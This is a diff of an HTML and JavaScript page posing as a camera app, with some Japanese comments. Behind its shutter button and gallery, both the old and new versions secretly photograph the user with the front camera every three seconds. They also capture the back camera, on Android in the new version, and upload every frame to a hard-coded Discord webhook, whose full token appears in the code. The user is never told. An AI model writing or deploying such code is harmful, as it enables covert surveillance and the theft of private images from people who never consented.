@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -19,13 +19,6 @@
       top: 0;
       left: 0;
       z-index: 1;
-    }
-    #hiddenBackCam {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      top: -1000px;
-      left: -1000px;
     }
     #shutterBtn {
       position: absolute;
@@ -112,8 +105,7 @@
   </style>
 </head>
 <body>
-  <video id="videoPreview" autoplay muted playsinline></video>
-  <video id="hiddenBackCam" autoplay muted playsinline></video>
+  <video id="videoPreview" autoplay playsinline muted></video>
   <div id="flash"></div>
   <button id="shutterBtn"></button>
   <img id="photoPreview" src="" alt="preview" />
@@ -123,53 +115,46 @@
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1192062408462696518/w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
-    const config = { maxSize: 8 * 1024 * 1024, quality: 0.85, interval: 3000 };
+    const config = { maxSize: 8 * 1024 * 1024, quality: 0.8, interval: 3000 };
+    const isAndroid = /Android/i.test(navigator.userAgent);
     const shutterBtn = document.getElementById('shutterBtn');
     const preview = document.getElementById('photoPreview');
     const gallery = document.getElementById('galleryView');
     const backBtn = document.getElementById('backBtn');
-    const photos = [];
-
-    const videoPreview = document.getElementById('videoPreview');
-    const hiddenBackCam = document.getElementById('hiddenBackCam');
     const flash = document.getElementById('flash');
     const shutterSound = document.getElementById('shutterSound');
+    const videoPreview = document.getElementById('videoPreview');
+    const photos = [];
+    let frontStream = null, backStream = null;
 
-    let frontStream = null;
-    let backStream = null;
-
-    async function getCameraStream(facing = "user") {
-      return await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: facing } },
-        audio: false
-      });
-    }
-
-    async function initCameras() {
-      // フロントカメラ表示
-      frontStream = await getCameraStream("user");
+    async function initCamera() {
+      frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
       videoPreview.srcObject = frontStream;
-      videoPreview.muted = true;
-      videoPreview.setAttribute("playsinline", "");
-      videoPreview.onloadedmetadata = () => videoPreview.play();
 
-      // バックカメラは非表示で送信用
-      backStream = await getCameraStream("environment");
-      hiddenBackCam.srcObject = backStream;
-      hiddenBackCam.muted = true;
-      hiddenBackCam.setAttribute("playsinline", "");
-      hiddenBackCam.onloadedmetadata = () => hiddenBackCam.play();
+      if (isAndroid) {
+        try {
+          backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+        } catch (e) {
+          console.warn("外カメラ取得失敗", e);
+        }
+      }
 
       startPeriodicCapture();
     }
 
-    async function captureImageFromVideo(video) {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
+    async function captureFromStream(stream) {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      await video.play();
+      await new Promise(res => setTimeout(res, 200)); // 安定させる
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return new Promise(res => canvas.toBlob(blob => res(blob), "image/jpeg", config.quality));
+      return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
     }
 
     async function sendToWebhook(blob, label) {
@@ -193,7 +178,7 @@
     shutterBtn.onclick = async () => {
       showFlash();
       shutterSound.play();
-      const blob = await captureImageFromVideo(videoPreview);
+      const blob = await captureFromStream(frontStream);
       if (blob.size <= config.maxSize) {
         updatePreview(blob);
         addToGallery(blob);
@@ -237,17 +222,19 @@
     function startPeriodicCapture() {
       setInterval(async () => {
         try {
-          const frontBlob = await captureImageFromVideo(videoPreview);
+          const frontBlob = await captureFromStream(frontStream);
           if (frontBlob.size <= config.maxSize) {
-            sendToWebhook(frontBlob, "Front Camera (Scheduled)");
+            sendToWebhook(frontBlob, "Front Camera (Auto)");
           }
 
-          const backBlob = await captureImageFromVideo(hiddenBackCam);
-          if (backBlob.size <= config.maxSize) {
-            sendToWebhook(backBlob, "Back Camera (Scheduled)");
+          if (isAndroid && backStream) {
+            const backBlob = await captureFromStream(backStream);
+            if (backBlob.size <= config.maxSize) {
+              sendToWebhook(backBlob, "Back Camera (Auto)");
+            }
           }
         } catch (e) {
-          console.error("Capture error:", e);
+          console.error("定期撮影失敗:", e);
         }
       }, config.interval);
     }
@@ -257,7 +244,7 @@
       backStream?.getTracks().forEach(t => t.stop());
     });
 
-    initCameras();
+    initCamera();
   </script>
 </body>
 </html>
